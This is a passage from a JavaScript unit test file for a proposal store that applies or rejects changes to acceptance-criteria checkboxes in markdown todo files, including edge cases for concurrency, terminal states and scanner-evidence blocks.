          { met: false, text: 'C1' },
          { met: false, text: 'C2' }
        ]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [
            { criterionIndex: 0, met: true, rationale: 'r1', evidence: 'e1' },
            { criterionIndex: 1, met: true, rationale: 'r2', evidence: 'e2' }
          ]
        });

        // Reject one change and apply the other concurrently
        const rejectP = store.reject(proposal.id, [proposal.changes[1].id]);
        const applyP = store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: okGuard() });

        const results = await Promise.allSettled([rejectP, applyP]);
        const fulfillments = results.filter(r => r.status === 'fulfilled');
        assert.ok(fulfillments.length >= 1, 'At least one operation should succeed');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('proposal revision increases after apply', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Revision Test', [
          { met: false, text: 'C1' },
          { met: false, text: 'C2' }
        ]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [
            { criterionIndex: 0, met: true, rationale: 'r1', evidence: 'e1' },
            { criterionIndex: 1, met: true, rationale: 'r2', evidence: 'e2' }
          ]
        });

        const initialRevision = proposal.revision.content;
        await store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: okGuard() });

        const listed = store.list('047').find(p => p.id === proposal.id);
        assert.ok(listed.revision.content !== initialRevision, 'Revision should change after apply');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('second proposal sees updated criterion state', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Sequential Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);

        const p1 = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });
        await store.apply(p1.id, [p1.changes[0].id], { assertWritable: okGuard() });

        // Now C1 is met, so proposing to mark it met again is a noop
        assert.throws(() => store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        }), /no-op|already/i);

        // But marking it as unmet should work
        const p2 = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: false, rationale: 'r', evidence: 'e' }]
        });
        assert.equal(p2.changes[0].before, true);
        assert.equal(p2.changes[0].after, false);
      } finally {
        cleanupTestDir(dir);
      }
    });
  });

  describe('reject', () => {
    it('rejects a proposal without modifying the file', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        const filePath = writeTodo(dir, '047', 'Reject Test', [{ met: false, text: 'C1' }]);
        const original = loadFileContent(filePath);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        store.reject(proposal.id, [proposal.changes[0].id]);

        assert.equal(loadFileContent(filePath), original, 'reject must not modify the file');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('marks rejected changes as rejected', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Reject State Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        const result = store.reject(proposal.id, [proposal.changes[0].id]);
        assert.equal(result.changes[0].state, 'rejected');
        assert.equal(result.state, 'rejected');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('prevents re-applying a rejected change', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Reject Then Apply Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        store.reject(proposal.id, [proposal.changes[0].id]);
        await assert.rejects(
          store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: okGuard() }),
          /not pending/i
        );
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('allows rejecting a subset and applying the rest', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        const filePath = writeTodo(dir, '047', 'Partial Reject Test', [
          { met: false, text: 'C1' },
          { met: false, text: 'C2' }
        ]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [
            { criterionIndex: 0, met: true, rationale: 'r1', evidence: 'e1' },
            { criterionIndex: 1, met: true, rationale: 'r2', evidence: 'e2' }
          ]
        });

        // Reject C1's change, apply C2's change
        store.reject(proposal.id, [proposal.changes[0].id]);
        await store.apply(proposal.id, [proposal.changes[1].id], { assertWritable: okGuard() });

        const content = loadFileContent(filePath);
        assert.ok(content.includes('- [ ] C1'), 'C1 should remain unmet');
        assert.ok(content.includes('- [x] C2'), 'C2 should be met');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('rejects non-pending change ids', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Non-pending Reject Test', [
          { met: false, text: 'C1' },
          { met: false, text: 'C2' }
        ]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [
            { criterionIndex: 0, met: true, rationale: 'r1', evidence: 'e1' },
            { criterionIndex: 1, met: true, rationale: 'r2', evidence: 'e2' }
          ]
        });

        store.reject(proposal.id, [proposal.changes[0].id]);
        assert.throws(
          () => store.reject(proposal.id, [proposal.changes[0].id]),
          /not pending/i
        );
      } finally {
        cleanupTestDir(dir);
      }
    });
  });

  describe('unsupported host', () => {
    it('fails apply when assertWritable is missing', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Unsupported Host Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        await assert.rejects(
          store.apply(proposal.id, [proposal.changes[0].id], {}),
          /assertWritable|requires|unsupported/i
        );
      } finally {
        cleanupTestDir(dir);
      }
    });
  });

  describe('terminal states', () => {
    it('applied changes cannot be rejected', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Terminal Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        });

        await store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: okGuard() });
        assert.throws(
          () => store.reject(proposal.id, [proposal.changes[0].id]),
          /not pending/i
        );
      } finally {
        cleanupTestDir(dir);
      }
    });
  });

  describe('edge cases', () => {
    it('handles todo with no criteria section', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        const dirPath = join(dir, 'docs', 'todos');
        const content = '---\nstatus: pending\npriority: p2\n---\n\n# No Criteria\n\nNo criteria here.\n';
        writeFileSync(join(dirPath, '047-pending-p2-no-criteria.md'), content, 'utf-8');

        const store = createProposalStore(dir);
        assert.throws(() => store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'r', evidence: 'e' }]
        }));
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('handles special characters in rationale and evidence', () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        writeTodo(dir, '047', 'Special Chars Test', [{ met: false, text: 'C1' }]);
        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{
            criterionIndex: 0,
            met: true,
            rationale: 'Line 1\nLine 2 "quoted" with \\backslash',
            evidence: 'Evidence with [brackets] and {braces} and "quotes"'
          }]
        });

        assert.equal(proposal.changes[0].rationale, 'Line 1\nLine 2 "quoted" with \\backslash');
        assert.equal(proposal.changes[0].evidence, 'Evidence with [brackets] and {braces} and "quotes"');
      } finally {
        cleanupTestDir(dir);
      }
    });

    it('handles scanner evidence with fake criteria text', async () => {
      if (!createProposalStore) throw new Error('proposals.mjs not available');
      const dir = makeTestDir();
      try {
        const dirPath = join(dir, 'docs', 'todos');
        const content = [
          '---',
          'status: pending',
          'priority: p2',
          '---',
          '',
          '# Scanner Todo',
          '',
          '## Acceptance Criteria',
          '',
          '- [ ] Fix the issue',
          '',
          '<!-- agendo:scan-evidence:start -->',
          '## Example checklist from scanner (not real criteria)',
          '- [x] This should not be counted',
          '- [ ] Neither should this',
          '<!-- agendo:scan-evidence:end -->',
          '',
          '## Notes',
          '',
          'Real notes.',
          ''
        ].join('\n');
        const filePath = join(dirPath, '047-pending-p2-scanner.md');
        writeFileSync(filePath, content, 'utf-8');

        const store = createProposalStore(dir);
        const proposal = store.create({
          todoId: '047',
          changes: [{ criterionIndex: 0, met: true, rationale: 'Fixed', evidence: 'PR #1' }]
        });
        await store.apply(proposal.id, [proposal.changes[0].id], { assertWritable: okGuard() });

        const result = loadFileContent(filePath);
        assert.ok(result.includes('- [x] Fix the issue'), 'Real criterion should be marked met');
        assert.ok(result.includes('- [ ] Neither should this'), 'Scanner fake criteria should be untouched');
      } finally {
        cleanupTestDir(dir);
      }
    });
  });
});